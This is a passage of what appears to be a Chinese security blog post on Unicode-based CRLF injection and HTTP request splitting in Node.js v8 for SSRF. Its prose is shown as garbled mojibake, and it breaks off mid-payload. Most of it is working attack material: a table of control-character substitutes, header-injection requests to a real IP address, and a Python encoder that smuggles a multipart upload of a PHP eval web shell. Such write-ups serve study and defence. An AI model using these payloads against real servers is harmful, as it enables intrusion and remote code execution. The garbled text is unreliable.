<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u010D\u010A/WHOAMI&#x27;</span>).<span class="property">output</span></span><br><span class="line">[ <span class="string">&#x27;GET /ÄÄŠ/WHOAMI HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å½“ç»“æœå­—ç¬¦ä¸²è¢«ç¼–ç ä¸º latin1 å†™å…¥è·¯å¾„æ—¶ï¼Œè¿™äº›å­—ç¬¦å°†åˆ†åˆ«è¢«æˆªæ–­ä¸º â€œ\râ€ï¼ˆ%0dï¼‰å’Œ â€œ\nâ€ï¼ˆ%0aï¼‰ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u&#123;010D&#125;\u&#123;010A&#125;/WHOAMI&#x27;</span>, <span class="string">&#x27;latin1&#x27;</span>).<span class="title function_">toString</span>()</span><br><span class="line"><span class="string">&#x27;http://47.101.57.72:4000/\r\n/WHOAMI&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://p4.ssl.qhimg.com/t01820e6d889f5f8892.png" alt="img"></p>
<p>å¯è§ï¼Œé€šè¿‡åœ¨è¯·æ±‚è·¯å¾„ä¸­åŒ…å«ç²¾å¿ƒé€‰æ‹©çš„Unicodeå­—ç¬¦ï¼Œæ”»å‡»è€…å¯ä»¥æ¬ºéª—Node.jså¹¶æˆåŠŸå®ç°CRLFæ³¨å…¥ã€‚</p>
<p>ä¸ä»…æ˜¯CRLFï¼Œæ‰€æœ‰çš„æ§åˆ¶å­—ç¬¦éƒ½å¯ä»¥é€šè¿‡è¿™ä¸ªæ„é€ å‡ºæ¥ã€‚ä¸‹é¢æ˜¯æˆ‘åˆ—ä¸¾å‡ºæ¥çš„è¡¨æ ¼ï¼Œç¬¬ä¸€åˆ—æ˜¯éœ€è¦æ„é€ çš„å­—ç¬¦ï¼Œç¬¬äºŒåˆ—æ˜¯å¯æ„é€ å‡ºç›¸åº”å­—ç¬¦çš„é«˜ç¼–å·çš„Unicodeç ï¼Œç¬¬ä¸‰åˆ—æ˜¯é«˜ç¼–å·çš„Unicodeç å¯¹åº”çš„å­—ç¬¦ï¼Œç¬¬å››åˆ—æ˜¯é«˜ç¼–å·çš„Unicodeç å¯¹åº”çš„å­—ç¬¦çš„URLç¼–ç ï¼š</p>
<table>
<thead>
<tr>
<th align="center">å­—ç¬¦</th>
<th align="center">å¯ç”±ä»¥ä¸‹Unicodeç¼–ç æ„é€ å‡º</th>
<th align="center">Unicodeç¼–ç å¯¹åº”çš„å­—ç¬¦</th>
<th align="center">Unicodeç¼–ç å¯¹åº”çš„å­—ç¬¦å¯¹åº”çš„URLç¼–ç </th>
</tr>
</thead>
<tbody><tr>
<td align="center">å›è½¦ç¬¦ \r</td>
<td align="center">\u010d</td>
<td align="center">Ä</td>
<td align="center">%C4%8D</td>
</tr>
<tr>
<td align="center">æ¢è¡Œç¬¦ \n</td>
<td align="center">\u010a</td>
<td align="center">ÄŠ</td>
<td align="center">%C4%8A</td>
</tr>
<tr>
<td align="center">ç©ºæ ¼</td>
<td align="center">\u0120</td>
<td align="center">Ä </td>
<td align="center">%C4%A0</td>
</tr>
<tr>
<td align="center">åæ–œæ  \</td>
<td align="center">\u0122</td>
<td align="center">Ä¢</td>
<td align="center">%C4%A2</td>
</tr>
<tr>
<td align="center">å•å¼•å· â€˜</td>
<td align="center">\u0127</td>
<td align="center">Ä§</td>
<td align="center">%C4%A7</td>
</tr>
<tr>
<td align="center">åå¼•å· &#96;</td>
<td align="center">\u0160</td>
<td align="center">Å </td>
<td align="center">%C5%A0</td>
</tr>
<tr>
<td align="center">å¹å· !</td>
<td align="center">\u0121</td>
<td align="center">Ä¡</td>
<td align="center">%C4%A1</td>
</tr>
</tbody></table>
<p>è¿™ä¸ªbugå·²ç»åœ¨Node.js10ä¸­è¢«ä¿®å¤ï¼Œå¦‚æœè¯·æ±‚è·¯å¾„åŒ…å«éAsciiå­—ç¬¦ï¼Œåˆ™ä¼šæŠ›å‡ºé”™è¯¯ã€‚ä½†æ˜¯å¯¹äº Node.js v8 æˆ–æ›´ä½ç‰ˆæœ¬ï¼Œå¦‚æœæœ‰ä¸‹åˆ—æƒ…å†µï¼Œä»»ä½•å‘å‡ºHTTPè¯·æ±‚çš„æœåŠ¡å™¨éƒ½å¯èƒ½å—åˆ°é€šè¿‡è¯·æ±‚æ‹†å®ç°çš„SSRFçš„æ”»å‡»ï¼š</p>
<ul>
<li>æ¥å—æ¥è‡ªç”¨æˆ·è¾“å…¥çš„Unicodeæ•°æ®</li>
<li>å¹¶å°†å…¶åŒ…å«åœ¨HTTPè¯·æ±‚çš„è·¯å¾„ä¸­</li>
<li>ä¸”è¯·æ±‚å…·æœ‰ä¸€ä¸ª0é•¿åº¦çš„ä¸»ä½“ï¼ˆæ¯”å¦‚ä¸€ä¸ª <code>GET</code> æˆ–è€… <code>DELETE</code>ï¼‰</li>
</ul>
<h3 id="åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ"><a href="#åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ" class="headerlink" title="åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ"></a>åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ</h3><p>ç”±äº NodeJS çš„è¿™ä¸ª CRLF æ³¨å…¥ç‚¹åœ¨ HTTP çŠ¶æ€è¡Œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¦æ³¨å…¥æ¶æ„çš„ HTTP é¦–éƒ¨å­—æ®µçš„è¯è¿˜éœ€è¦é—­åˆçŠ¶æ€è¡Œä¸­ <code>HTTP/1.1</code> ï¼Œå³ä¿è¯æ³¨å…¥åæœ‰æ­£å¸¸çš„ HTTP çŠ¶æ€è¡Œï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami&#x27;</span>).<span class="property">output</span></span><br><span class="line">[ <span class="string">&#x27;GET /Ä HTTP/1.1ÄÄŠSet-Cookie:Ä PHPSESSID=whoami HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<p><img src="https://p4.ssl.qhimg.com/t01833dd0e566e383b1.png" alt="img"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæˆåŠŸæ„é€ å‡ºäº†ä¸€ä¸ª Set-Cookie é¦–éƒ¨å­—æ®µï¼Œè™½ç„¶åé¢è¿˜æœ‰ä¸€ä¸ª <code>HTTP/1.1</code> ï¼Œä½†æˆ‘ä»¬æ ¹æ®è¯¥åŸç†ä¾ç„¶å¯ä»¥å°†å…¶é—­åˆï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.<span class="title function_">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/\u0120HTTP/1.1\u010D\u010ASet-Cookie:\u0120PHPSESSID=whoami\u010D\u010Atest:&#x27;</span>).<span class="property">output</span></span><br><span class="line">[ <span class="string">&#x27;GET /Ä HTTP/1.1ÄÄŠSet-Cookie:Ä PHPSESSID=whoamiÄÄŠtest: HTTP/1.1\r\nHost: 47.101.57.72:4000\r\nConnection: close\r\n\r\n&#x27;</span> ]</span><br></pre></td></tr></table></figure>

<p><img src="https://p5.ssl.qhimg.com/t0196c013fcb593f5dc.png" alt="img"></p>
<p>è¿™æ ·ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥æ„é€  â€œä»»æ„â€ çš„HTTPè¯·æ±‚äº†ã€‚</p>
<h3 id="åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´-HTTP-è¯·æ±‚"><a href="#åœ¨-HTTP-çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´-HTTP-è¯·æ±‚" class="headerlink" title="åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´ HTTP è¯·æ±‚"></a>åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´ HTTP è¯·æ±‚</h3><p>é¦–å…ˆï¼Œç”±äº NodeJS çš„è¿™ä¸ª CRLF æ³¨å…¥ç‚¹åœ¨ HTTP çŠ¶æ€è¡Œï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¦æ³¨å…¥å®Œæ•´çš„ HTTP è¯·æ±‚çš„è¯éœ€è¦å…ˆé—­åˆçŠ¶æ€è¡Œä¸­ <code>HTTP/1.1</code> ï¼Œå³ä¿è¯æ³¨å…¥åæœ‰æ­£å¸¸çš„ HTTP çŠ¶æ€è¡Œã€‚å…¶æ¬¡ä¸ºäº†ä¸è®©åŸæ¥çš„ <code>HTTP/1.1</code> å½±å“æˆ‘ä»¬æ–°æ„é€ çš„è¯·æ±‚ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å†æ„é€ ä¸€æ¬¡ <code>GET /</code> é—­åˆåŸæ¥çš„ HTTP è¯·æ±‚ã€‚</p>
<p>å‡è®¾ç›®æ ‡ä¸»æœºå­˜åœ¨SSRFï¼Œéœ€è¦æˆ‘ä»¬åœ¨ç›®æ ‡ä¸»æœºæœ¬åœ°ä¸Šä¼ æ–‡ä»¶ã€‚æˆ‘ä»¬éœ€è¦å°è¯•æ„é€ å¦‚ä¸‹è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ çš„å®Œæ•´ POST è¯·æ±‚ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>437</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=nk67astv61hqanskkddslkgst4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;MAX_FILE_SIZE&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="number">100000</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;uploaded&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span></span><br><span class="line"><span class="language-php">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Upload</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br></pre></td></tr></table></figure>

<p>ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªPOSTè¯·æ±‚é‡Œé¢çš„æ‰€æœ‰çš„å­—ç¬¦åŒ…æ‹¬æ§åˆ¶ç¬¦å…¨éƒ¨ç”¨ä¸Šè¿°çš„é«˜ç¼–å·Unicodeç è¡¨ç¤ºï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#x27;&#x27; HTTP/1.1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">POST /upload.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 437</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=nk67astv61hqanskkddslkgst4</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100000</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;shell.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php eval($_POST[&quot;whoami&quot;]);?&gt;</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;Upload&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Upload</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">GET / HTTP/1.1</span></span><br><span class="line"><span class="string">test:&#x27;&#x27;&#x27;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">payload_encode</span>(<span class="params">raw</span>):</span><br><span class="line">    ret = <span class="string">u&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> raw:</span><br><span class="line">        ret += <span class="built_in">chr</span>(<span class="number">0x0100</span>+<span class="built_in">ord</span>(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">payload = payload_encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡º: Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÄÄŠÅÅÅ“Å”Ä Ä¯ÅµÅ°Å¬Å¯Å¡Å¤Ä®Å°Å¨Å°Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅˆÅ¯Å³Å´ÄºÄ Ä±Ä²Ä·Ä®Ä°Ä®Ä°Ä®Ä±ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­ÅŒÅ¥Å®Å§Å´Å¨ÄºÄ Ä´Ä³Ä·ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å­ÅµÅ¬Å´Å©Å°Å¡Å²Å´Ä¯Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å¢Å¯ÅµÅ®Å¤Å¡Å²Å¹Ä½Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅ•Å³Å¥Å²Ä­ÅÅ§Å¥Å®Å´ÄºÄ ÅÅ¯ÅºÅ©Å¬Å¬Å¡Ä¯ÄµÄ®Ä°Ä Ä¨Å—Å©Å®Å¤Å¯Å·Å³Ä ÅÅ”Ä Ä±Ä°Ä®Ä°Ä»Ä Å—Å©Å®Ä¶Ä´Ä»Ä Å¸Ä¶Ä´Ä©Ä ÅÅ°Å°Å¬Å¥Å—Å¥Å¢Å‹Å©Å´Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶Ä Ä¨Å‹ÅˆÅ”ÅÅŒÄ¬Ä Å¬Å©Å«Å¥Ä Å‡Å¥Å£Å«Å¯Ä©Ä ÅƒÅ¨Å²Å¯Å­Å¥Ä¯Ä¹Ä°Ä®Ä°Ä®Ä´Ä´Ä³Ä°Ä®Ä·Ä²Ä Å“Å¡Å¦Å¡Å²Å©Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶ÄÄŠÅÅ£Å£Å¥Å°Å´ÄºÄ Å´Å¥Å¸Å´Ä¯Å¨Å´Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å¨Å´Å­Å¬Ä«Å¸Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å­Å¬Ä»Å±Ä½Ä°Ä®Ä¹Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å¶Å©Å¦Ä¬Å©Å­Å¡Å§Å¥Ä¯Å·Å¥Å¢Å°Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å°Å®Å§Ä¬ÄªÄ¯ÄªÄ»Å±Ä½Ä°Ä®Ä¸Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å³Å©Å§Å®Å¥Å¤Ä­Å¥Å¸Å£Å¨Å¡Å®Å§Å¥Ä»Å¶Ä½Å¢Ä³Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­Å…Å®Å£Å¯Å¤Å©Å®Å§ÄºÄ Å§ÅºÅ©Å°Ä¬Ä Å¤Å¥Å¦Å¬Å¡Å´Å¥ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­ÅŒÅ¡Å®Å§ÅµÅ¡Å§Å¥ÄºÄ ÅºÅ¨Ä­ÅƒÅÄ¬ÅºÅ¨Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅƒÅ¯Å¯Å«Å©Å¥ÄºÄ ÅÅˆÅÅ“Å…Å“Å“Å‰Å„Ä½Å®Å«Ä¶Ä·Å¡Å³Å´Å¶Ä¶Ä±Å¨Å±Å¡Å®Å³Å«Å«Å¤Å¤Å³Å¬Å«Å§Å³Å´Ä´ÄÄŠÅƒÅ¯Å®Å®Å¥Å£Å´Å©Å¯Å®ÄºÄ Å£Å¬Å¯Å³Å¥ÄÄŠÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅÅÅ˜ÅŸÅ†Å‰ÅŒÅ…ÅŸÅ“Å‰ÅšÅ…Ä¢ÄÄŠÄÄŠÄ±Ä°Ä°Ä°Ä°Ä°ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅµÅ°Å¬Å¯Å¡Å¤Å¥Å¤Ä¢Ä»Ä Å¦Å©Å¬Å¥Å®Å¡Å­Å¥Ä½Ä¢Å³Å¨Å¥Å¬Å¬Ä®Å°Å¨Å°Ä¢ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¯Å£Å´Å¥Å´Ä­Å³Å´Å²Å¥Å¡Å­ÄÄŠÄÄŠÄ¼Ä¿Å°Å¨Å°Ä Å¥Å¶Å¡Å¬Ä¨Ä¤ÅŸÅÅÅ“Å”Å›Ä¢Å·Å¨Å¯Å¡Å­Å©Ä¢ÅÄ©Ä»Ä¿Ä¾ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢Å•Å°Å¬Å¯Å¡Å¤Ä¢ÄÄŠÄÄŠÅ•Å°Å¬Å¯Å¡Å¤ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶Ä­Ä­ÄÄŠÄÄŠÅ‡Å…Å”Ä Ä¯Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅ´Å¥Å³Å´Äº</span></span><br></pre></td></tr></table></figure>

<p>æ„é€ è¯·æ±‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; http.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;http://47.101.57.72:4000/Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÄÄŠÅÅÅ“Å”Ä Ä¯ÅµÅ°Å¬Å¯Å¡Å¤Ä®Å°Å¨Å°Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅˆÅ¯Å³Å´ÄºÄ Ä±Ä²Ä·Ä®Ä°Ä®Ä°Ä®Ä±ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­ÅŒÅ¥Å®Å§Å´Å¨ÄºÄ Ä´Ä³Ä·ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å­ÅµÅ¬Å´Å©Å°Å¡Å²Å´Ä¯Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å¢Å¯ÅµÅ®Å¤Å¡Å²Å¹Ä½Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅ•Å³Å¥Å²Ä­ÅÅ§Å¥Å®Å´ÄºÄ ÅÅ¯ÅºÅ©Å¬Å¬Å¡Ä¯ÄµÄ®Ä°Ä Ä¨Å—Å©Å®Å¤Å¯Å·Å³Ä ÅÅ”Ä Ä±Ä°Ä®Ä°Ä»Ä Å—Å©Å®Ä¶Ä´Ä»Ä Å¸Ä¶Ä´Ä©Ä ÅÅ°Å°Å¬Å¥Å—Å¥Å¢Å‹Å©Å´Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶Ä Ä¨Å‹ÅˆÅ”ÅÅŒÄ¬Ä Å¬Å©Å«Å¥Ä Å‡Å¥Å£Å«Å¯Ä©Ä ÅƒÅ¨Å²Å¯Å­Å¥Ä¯Ä¹Ä°Ä®Ä°Ä®Ä´Ä´Ä³Ä°Ä®Ä·Ä²Ä Å“Å¡Å¦Å¡Å²Å©Ä¯ÄµÄ³Ä·Ä®Ä³Ä¶ÄÄŠÅÅ£Å£Å¥Å°Å´ÄºÄ Å´Å¥Å¸Å´Ä¯Å¨Å´Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å¨Å´Å­Å¬Ä«Å¸Å­Å¬Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¸Å­Å¬Ä»Å±Ä½Ä°Ä®Ä¹Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å¶Å©Å¦Ä¬Å©Å­Å¡Å§Å¥Ä¯Å·Å¥Å¢Å°Ä¬Å©Å­Å¡Å§Å¥Ä¯Å¡Å°Å®Å§Ä¬ÄªÄ¯ÄªÄ»Å±Ä½Ä°Ä®Ä¸Ä¬Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å³Å©Å§Å®Å¥Å¤Ä­Å¥Å¸Å£Å¨Å¡Å®Å§Å¥Ä»Å¶Ä½Å¢Ä³Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­Å…Å®Å£Å¯Å¤Å©Å®Å§ÄºÄ Å§ÅºÅ©Å°Ä¬Ä Å¤Å¥Å¦Å¬Å¡Å´Å¥ÄÄŠÅÅ£Å£Å¥Å°Å´Ä­ÅŒÅ¡Å®Å§ÅµÅ¡Å§Å¥ÄºÄ ÅºÅ¨Ä­ÅƒÅÄ¬ÅºÅ¨Ä»Å±Ä½Ä°Ä®Ä¹ÄÄŠÅƒÅ¯Å¯Å«Å©Å¥ÄºÄ 